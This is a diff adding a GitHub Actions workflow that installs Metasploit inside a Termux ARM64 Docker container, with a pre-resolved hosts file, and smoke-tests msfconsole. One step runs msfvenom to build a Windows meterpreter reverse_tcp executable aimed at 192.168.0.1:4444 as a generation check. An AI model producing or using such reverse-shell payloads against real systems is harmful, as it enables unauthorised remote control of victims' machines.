@@ -1,0 +1,141 @@
+name: Metasploit on Termux (ARM64, DNS-bypass)
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "main", "master", "feature/**" ]
+  pull_request:
+    branches: [ "main", "master", "feature/**" ]
+
+jobs:
+  test-aarch64:
+    runs-on: ubuntu-24.04-arm
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout repo (use this branch's metasploit.sh)
+        uses: actions/checkout@v4
+
+      - name: Install DNS tools on host
+        run: |
+          set -euxo pipefail
+          sudo apt-get update
+          sudo apt-get install -y dnsutils
+
+      - name: Generate static DNS for Termux (/system/etc/hosts, IPv4 only)
+        id: gen-hosts
+        shell: bash
+        run: |
+          set -euxo pipefail
+          HOSTS="termux-hosts"
+          : > "$HOSTS"
+
+          # Domains your installer typically needs
+          domains=(
+            packages.termux.dev
+            raw.githubusercontent.com
+            packages-cf.termux.dev
+            termux.dev
+            github.com
+            rubygems.org
+            index.rubygems.org
+            pypi.org
+            files.pythonhosted.org
+          )
+
+          # Resolve each to an IPv4 address and write in hosts format
+          missing=()
+          for d in "${domains[@]}"; do
+            ip4=$(dig +short A "$d" | head -n1 || true)
+            if [[ -n "$ip4" ]]; then
+              echo "$ip4 $d" >> "$HOSTS"
+            else
+              missing+=("$d")
+            fi
+          done
+
+          echo "---- $HOSTS ----"
+          cat "$HOSTS"
+
+          # Fail early if we couldn't resolve critical domains on the host
+          critical=(packages.termux.dev raw.githubusercontent.com github.com rubygems.org)
+          for c in "${critical[@]}"; do
+            if ! grep -q " $c$" "$HOSTS"; then
+              echo "ERROR: Could not resolve critical domain: $c"
+              exit 1
+            fi
+          done
+
+          if [[ ${#missing[@]} -gt 0 ]]; then
+            echo "WARN: Could not resolve some domains on host: ${missing[*]}"
+          fi
+
+      - name: Start Termux (aarch64) with static hosts and repo mounted
+        run: |
+          set -euxo pipefail
+          docker pull termux/termux-docker:aarch64
+          docker rm -f termux || true
+          docker run -d --name termux \
+            --security-opt seccomp=unconfined \
+            -v "$PWD/termux-hosts:/system/etc/hosts:ro" \
+            -v "$GITHUB_WORKSPACE:/workspace:ro" \
+            termux/termux-docker:aarch64
+          # give runit/env a moment to settle
+          sleep 3
+          docker ps -a
+
+      - name: Seed apt mirror & update inside Termux
+        run: |
+          set -euxo pipefail
+          id=$(docker ps -q -f name=termux)
+          docker exec -u system "$id" bash -lc '
+            set -eux
+            # Use primary Termux mirror (bypasses pkg mirror selection)
+            echo "deb https://packages.termux.dev/apt/termux-main stable main" > /data/data/com.termux/files/usr/etc/apt/sources.list
+            apt update -y
+            apt install -y curl git
+          '
+
+      - name: Run metasploit installer from this repo
+        run: |
+          set -euxo pipefail
+          id=$(docker ps -q -f name=termux)
+          docker exec -u system "$id" bash -lc '
+            set -eux
+            # copy script from checked-out repo into $HOME
+            cp /workspace/metasploit.sh "$HOME/metasploit.sh"
+            chmod +x "$HOME/metasploit.sh"
+            # run and tee to a log for artifacting on failure
+            "$HOME/metasploit.sh" |& tee "$HOME/metasploit_install.log"
+          '
+
+      - name: Smoke test msfconsole (non-interactive)
+        run: |
+          set -euxo pipefail
+          id=$(docker ps -q -f name=termux)
+          docker exec -u system "$id" bash -lc 'msfconsole -qx "version; exit"' | tee msfconsole-version.txt
+
+      - name: Test msfvenom payload generation
+        run: |
+          set -euxo pipefail
+          id=$(docker ps -q -f name=termux)
+          docker exec -u system "$id" bash -lc '
+            set -eux
+            echo "Testing msfvenom payload generation..."
+            msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 lport=4444 -f exe -o my_payload.exe
+            echo "Payload generation completed successfully!"
+            ls -la my_payload.exe
+            file my_payload.exe || echo "file command not available, but payload exists"
+          '
+
+      - name: Upload logs on failure
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: termux-aarch64-logs
+          path: |
+            termux-hosts
+
+      - name: Cleanup
+        if: always()
+        run: docker rm -f termux || true
